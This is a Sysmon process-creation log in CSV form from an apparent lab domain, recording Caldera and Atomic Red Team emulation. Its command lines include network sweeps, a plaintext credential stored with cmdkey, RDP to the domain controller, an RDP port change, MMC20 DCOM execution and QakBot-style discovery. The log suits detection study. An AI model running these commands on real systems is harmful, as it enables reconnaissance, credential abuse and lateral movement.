computer_name,event_id,Image,OriginalFileName,CommandLine,CurrentDirectory,User,ParentImage,ParentCommandLine
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.201,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.201"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.193",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.193,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.193"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.194",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.198,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.198"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.199",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.199,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.199"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.248,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.248"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.247",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.247,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.247"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.248",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.249,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.249"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.249",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.251,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.251"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.252",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.252,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.252"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.253",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.253,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.253"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.254",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.254,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.254"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.255",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.255,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.255"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.250",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nslookup.exe,nslookup.exe,nslookup  172.16.26.250,C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.250"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""C:\Windows\system32\cmd.exe"" /c nslookup 172.16.26.251",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {$sampleData = \""""Sample data for exfiltration test\""""",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmdkey.exe,cmdkey.exe,"""C:\Windows\system32\cmdkey.exe"" /generic:TERMSRV/MY-CAL-DC /user:MY-CALDERA\johnny.douche /pass:1password2!",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$Server=$ENV:logonserver.TrimStart(\""""\\"""")"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\mstsc.exe,mstsc.exe,"""C:\Windows\system32\mstsc.exe"" /v:MY-CAL-DC",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {$Server=$ENV:logonserver.TrimStart(\""""\\"""")"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name \""""PortNumber\"""" -Value 4489",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""cmd.exe"" /c cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {[activator]::CreateInstance([type]::GetTypeFromProgID(\""""MMC20.application\"""",\""""localhost\"""")).Document.ActiveView.ExecuteShellCommand(\""""c:\windows\system32\calc.exe\"""", $null, $null, \""""7\"""")}",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Program Files (x86)\Microsoft Office\root\Office16\SDXHelper.exe,SDXHELPER.EXE,"""C:\Program Files (x86)\Microsoft Office\Root\Office16\SDXHelper.exe"" -Embedding",C:\Windows\system32\,MY-CALDERA\johnny.douche,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {Start-Process \""""C:\AtomicRedTeam\atomics\T1027.007\bin\ninja_syscall1.exe\""""",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\AtomicRedTeam\atomics\T1027.007\bin\ninja_syscall1.exe,-,"""C:\AtomicRedTeam\atomics\T1027.007\bin\ninja_syscall1.exe"" ",C:\Users\johnny.douche\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {Start-Process \""""C:\AtomicRedTeam\atomics\T1027.007\bin\ninja_syscall1.exe\"""""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\MoUsoCoreWorker.exe,MoUSOCoreWorker.exe,C:\Windows\System32\mousocoreworker.exe -Embedding,C:\Windows\system32\,NT AUTHORITY\SYSTEM,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Program Files (x86)\Microsoft Office\root\Office16\GRAPH.EXE,Graph.exe,"""C:\Program Files (x86)\Microsoft Office\Root\Office16\GRAPH.EXE"" /automation -Embedding",C:\Windows\system32\,MY-CALDERA\johnny.douche,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p
MY-CAL-WIN10.my-caldera.local,1,C:\Program Files (x86)\Microsoft Office\root\Office16\EXCEL.EXE,Excel.exe,"""C:\Program Files (x86)\Microsoft Office\Root\Office16\EXCEL.EXE"" -Embedding",C:\Windows\system32\,MY-CALDERA\johnny.douche,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\splwow64.exe,splwow64.exe,C:\Windows\splwow64.exe 12288,C:\Windows\,MY-CALDERA\johnny.douche,C:\Program Files (x86)\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files (x86)\Microsoft Office\Root\Office16\EXCEL.EXE"" /automation -Embedding"
MY-CAL-WIN10.my-caldera.local,1,C:\Program Files (x86)\Internet Explorer\iexplore.exe,IEXPLORE.EXE,"""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:6288 CREDAT:17410 /prefetch:2",C:\Users\johnny.douche\Desktop\,MY-CALDERA\johnny.douche,C:\Program Files\Internet Explorer\iexplore.exe,"""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\cmd.exe,Cmd.Exe,"""cmd.exe"" /c ipconfig /all & net config workstation & net view /all /domain & nltest /domain_trusts",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\nltest.exe,nltestrk.exe,nltest  /domain_trusts,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c ipconfig /all & net config workstation & net view /all /domain & nltest /domain_trusts"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.EXE,"""powershell.exe"" & {$ports = Get-content \""""C:\AtomicRedTeam\atomics\T1016\src\top-128.txt\""""",C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -executionpolicy bypass"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net.exe,net.exe,net  share,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net1.exe,net1.exe,C:\Windows\system32\net1  share,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\net.exe,net  share
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\ROUTE.EXE,route.exe,route  print,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\NETSTAT.EXE,netstat.exe,netstat  -nao,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net.exe,net.exe,net  localgroup,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1016\src\qakbot.bat"""
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\net1.exe,net1.exe,C:\Windows\system32\net1  localgroup,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\net.exe,net  localgroup
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.3,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.4,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.5,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.6,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.7,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.11,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.12,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.13,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.8,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.9,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.10,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.14,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.15,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.47,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.54,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.55,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.40,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.49,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.50,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.51,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.52,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.41,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.56,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.57,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
MY-CAL-WIN10.my-caldera.local,1,C:\Windows\System32\PING.EXE,ping.exe,ping  -n 1 -w 100 192.168.1.58,C:\Users\JOHNNY~1.DOU\AppData\Local\Temp\,MY-CALDERA\johnny.douche,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
